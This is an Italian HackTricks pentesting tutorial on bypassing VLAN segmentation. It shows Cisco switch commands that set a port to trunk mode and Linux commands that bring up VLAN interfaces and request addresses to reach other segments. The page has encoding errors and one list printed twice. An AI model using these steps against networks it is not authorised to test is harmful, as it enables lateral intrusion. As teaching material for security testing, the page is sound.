# Bypass della segmentazione VLAN laterale

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Se √® disponibile un accesso diretto a uno switch, √® possibile bypassare la segmentazione VLAN. Ci√≤ comporta la riconfigurazione della porta connessa in modalit√† trunk, l'instaurazione di interfacce virtuali per le VLAN di destinazione e l'impostazione degli indirizzi IP, sia in modo dinamico (DHCP) che statico, a seconda dello scenario (**per ulteriori dettagli consulta [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)).**

Inizialmente, √® necessario identificare la porta specifica connessa. Ci√≤ pu√≤ essere generalmente realizzato tramite messaggi CDP o cercando la porta tramite la maschera **include**.

**Se CDP non √® operativo, √® possibile tentare l'identificazione della porta cercando l'indirizzo MAC**:
```
SW1(config)# show mac address-table | include 0050.0000.0500
```
Prima di passare alla modalit√† trunk, √® necessario compilare un elenco delle VLAN esistenti e determinarne gli identificatori. Questi identificatori vengono quindi assegnati all'interfaccia, consentendo l'accesso alle diverse VLAN tramite il trunk. Ad esempio, la porta in uso √® associata alla VLAN 10.
```
SW1# show vlan brief
```
**Passare alla modalit√† trunk comporta l'ingresso nella modalit√† di configurazione dell'interfaccia**:
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
Passando alla modalit√† trunk, la connettivit√† verr√† temporaneamente interrotta, ma successivamente potr√† essere ripristinata.

Vengono quindi creati interfacce virtuali, assegnati ID VLAN e attivati:
```bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
```
Successivamente, viene effettuata una richiesta di indirizzo tramite DHCP. In alternativa, nei casi in cui DHCP non sia possibile, gli indirizzi possono essere configurati manualmente:
```bash
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
Esempio per impostare manualmente un indirizzo IP statico su un'interfaccia (VLAN 10):

```plaintext
1. Accedere al dispositivo di rete.
2. Identificare l'interfaccia desiderata (VLAN 10).
3. Aprire la configurazione dell'interfaccia.
4. Impostare l'indirizzo IP statico desiderato (ad esempio, 192.168.1.2).
5. Impostare la subnet mask corrispondente (ad esempio, 255.255.255.0).
6. Salvare le modifiche apportate alla configurazione dell'interfaccia.
7. Verificare che l'indirizzo IP statico sia stato correttamente assegnato all'interfaccia (VLAN 10).
```

```html
<ol>
<li>Accedere al dispositivo di rete.</li>
<li>Identificare l'interfaccia desiderata (VLAN 10).</li>
<li>Aprire la configurazione dell'interfaccia.</li>
<li>Impostare l'indirizzo IP statico desiderato (ad esempio, 192.168.1.2).</li>
<li>Impostare la subnet mask corrispondente (ad esempio, 255.255.255.0).</li>
<li>Salvare le modifiche apportate alla configurazione dell'interfaccia.</li>
<li>Verificare che l'indirizzo IP statico sia stato correttamente assegnato all'interfaccia (VLAN 10).</li>
</ol>
```
```bash
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
```
La connettivit√† viene testata avviando richieste ICMP ai gateway predefiniti per le VLAN 10, 20, 50 e 60.

In definitiva, questo processo consente di bypassare la segmentazione delle VLAN, facilitando cos√¨ l'accesso illimitato a qualsiasi rete VLAN e preparando il terreno per le azioni successive.

## Riferimenti

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al repository [hacktricks](https://github.com/carlospolop/hacktricks) e al repository [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
